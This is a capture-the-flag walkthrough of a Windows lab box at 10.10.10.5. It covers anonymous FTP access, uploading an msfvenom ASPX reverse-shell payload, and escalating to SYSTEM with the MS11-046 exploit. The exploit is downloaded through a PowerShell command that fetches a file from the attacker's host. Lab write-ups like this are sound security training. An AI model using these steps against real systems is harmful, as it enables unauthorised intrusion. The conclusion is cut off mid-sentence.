
# Information Gathering

## Nmap
We begin our reconnaissance by running an Nmap scan checking default scripts and testing for vulnerabilities.

```console
root@kali:~# nmap 10.10.10.5 -sV
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-30 11:10 EDT
Stats: 0:00:25 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 11:11 (0:00:06 remaining)
Nmap scan report for 10.10.10.5
Host is up (0.29s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```
From the above output we can see that ports, **21** and **80** are open.

Let's try to connect to ftp

```console
root@kali:~# ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> passiv



150 Opening ASCII mode data connection.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```
Here it is seen that ftp allows anonymous login. Let's go ahead and check if ftp allows the 'PUT' command.

[FTP](./Devel/Screenshot_3.png)
{**Figure 1:** Server runs on asp.net)

Idea is to craft a aspx payload and to deliver to the box using ftp PUT command.

We craft payload using msfvenom

[Msfvenom](./Devel/Screenshot_8.png)
(**Figure 2:** Msfvenom)

Delivering the payload
```console
ftp> put shell.asp
local: shell.asp remote: shell.asp
227 Entering Passive Mode (10,10,10,5,192,7).
125 Data connection already open; Transfer starting.
226 Transfer complete.
346 bytes sent in 0.00 secs (1.8748 MB/s)
````

Listening to netcat on port 4444 to catch the shell.

[Netcat](./Devel/Screenshot_4.png)
{**Figure 3:** Netcat listener)

# Exploitation  

Open the ip on the browser and navigate to the payload we delivered on the server.

[Payload](./Devel/Screenshot_5.png)
{**Figure 4:** Payload)

[Shell](./Devel/Screenshot_6.png)
{**Figure 4:** We got a reverse shell!)

[Low Shell](./Devel/Screenshot_7.png)
{**Figure 4:** Shell is a low privileged one)

Shell is a low privilged one, now for privesc.

#Privilege Escalation

[Sysinfo](./Devel/Screenshot_20.png)
{**Figure 4:** Here we see that the machine is running windows 7 build 7600)

Searching google for local prives for windows 7 reveals privesc payload. Next we download that and deliver it to the machine.

[Google](./Devel/Screenshot_19.png)
{**Figure 4:** Local Privesc)

We need to compile the file, all the instructions are in the payload file itself.

After the compilation we could deliver the payload either using ftp or using powershell. Here let's use powershell

Open a server on port 9005 using python

```console
python -m SimpleHTTPServer 9005
```

On the machine shell, type in the command to get a file using powershell
```console
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.20:9005/MS11-046.exe', 'c:\Users\Public\Downloads\MS46.exe')"
```

Exec the executable file

```console
c:\Users\Public\Downloads>MS46.exe
MS46.exe
```

```console
c:\Windows\System32>whoami
whoami
nt authority\system
```


## User Flag

In order to get the user flag, we change the directory to the user Desktop 'babis' and we simply need to use `cat` to read the contents of user.txt
```
root@kali:~$ cat user.txt

```

## Root Flag

There's no need to privesc this box as we could easily change directory to the Administrator Desktop folder and `cat` the root.txt
```
root@kali:~$ cat root.txt

```

# Conclusion
This box could also be solved using msfconsole, catch the shell using meterpreter with the apsx payload, once the shell is acquired background it and run local_exploit_suggester on the session and run the exploit which the 

